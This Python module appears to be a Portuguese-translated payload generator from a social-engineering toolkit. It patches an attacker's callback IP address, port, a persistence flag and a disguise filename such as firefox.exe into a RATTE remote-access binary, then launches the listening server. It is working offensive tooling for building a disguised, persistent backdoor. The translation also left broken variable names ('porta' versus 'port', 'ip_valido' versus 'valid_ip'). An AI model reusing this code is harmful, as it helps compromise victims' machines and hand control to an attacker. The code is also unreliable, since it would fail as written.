#!/usr/bin/env python
#
# Estes são os campos obrigatórios
#
import os
import subprocess
from time import sleep

import src.core.setcore as core
from src.core.menu import text

# Compatibilidade entre Py2/3
# O Python 3 renomeou raw_input para input
try:
    input = raw_input
except NameError:
    pass

# "Este é o módulo de preparação RATTE (Remote Administration Tool edição Tommy). Ele irá preparar um ratteM.exe personalizado."
MAIN="RATTE (Remote Administration Tool edição Tommy) Criar apenas Payload. Leia o readme/RATTE-Readme.txt primeiro"
AUTHOR="Thomas Werth & Tiago Matias"


#
# Inicia o servidor RATTE
#
def ratte_listener_start(porta):
    subprocess.Popen("src/payloads/ratte/ratteserver %d" % port, shell=True).wait()


def prepare_ratte(ipaddr, ratteport, persistent, customexe):
    core.print_info("preparando RATTE...")
    # substitui o endereço IP por aquele que precisamos para a conexão reversa
    ############
    # Carrega o conteúdo do RATTE
    ############
    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
        data = fileopen.read()

    ############
    # PATCH IP do Servidor no RATTE
    ############
    with open(os.path.join(core.userconfigpath, "ratteM.exe"), "wb") as filewrite:

        host = (len(ipaddr) + 1) * "X"
        r_port = (len(str(ratteport)) + 1) * "Y"
        pers = (len(str(persistent)) + 1) * "Z"
        # verifica se customexe > 0, caso contrário um campo será patchado (errado!)
        if customexe:
            cexe = (len(str(customexe)) + 1) * "Q"
        else:
            cexe = ""

        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))


# def main(): cabeçalho é necessário
def main():
    valid_sie = False
    valid_ip = False
    valid_response = False
    input_counter = 0

    #################
    # obter entrada do usuário
    #################
    while valid_ip != True and input_counter < 3:
        ipaddr = input(core.setprompt(["9", "2"], "Digite o endereço IP para conectar de volta"))
        valid_ip = core.validate_ip(ipaddr)
        if not ip_valido:
            if input_counter == 2:
                core.print_error("\nTalvez você tenha escrito o endereço errado?")
                sleep(4)
                return
            else:
                input_counter += 1

    try:
        ratteport = int(input(core.setprompt(["9", "2"], "Porta que o Servidor RATTE deve escutar [8080]")))
        while ratteport == 0 or ratteport > 65535:
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(input(core.setprompt(["9", "2"], "Digite a porta que o Servidor RATTE deve escutar [8080]")))
    except ValueError:
        ratteport = 8080

    while not valid_response:
        persistent = input(core.setprompt(["9", "2"], "Deve o RATTE ser persistente [não|sim]?"))
        persistent = str.lower(persistent)
        if persistent == "não" or persistent == "n":
            persistent = "NÃO"
            valid_response = True
        elif persistent == "sim" or persistent == "s":
            persistent = "SIM"
            valid_response = True
        else:
            core.print_warning(text.YES_NO_RESPONSES)

    valid_response = False

    customexe = input(core.setprompt(["9", "2"], "Usar nome de arquivo específico (ex. firefox.exe) [filename.exe ou vazio]?"))

    ############
    # preparar RATTE
    ############
    prepare_ratte(ipaddr, ratteport, persistent, customexe)

    core.print_status("Payload exportado para %s" % os.path.join(core.userconfigpath, "ratteM.exe"))

    ###################
    # iniciar o servidor RATTE
    ###################
    while not valid_response:
        prompt = input(core.setprompt(["9", "2"], "Iniciar o listener do ratteserver agora [sim|não]?"))
        prompt = str.lower(prompt)
        if prompt == "não" or prompt == "n":
            core.print_error("Abortando...")
            sleep(2)
            valid_response = True
        elif prompt == "sim" or prompt == "s":
            core.print_info("Iniciando o ratteserver...")
            ratte_listener_start(ratteport)
            core.print_info("Parando o ratteserver...")
            sleep(2)
            valid_response = True
        else:
            core.print_warning("Respostas válidas são 'n|s|N|S|não|sim|Não|Sim|NÃO|SIM'")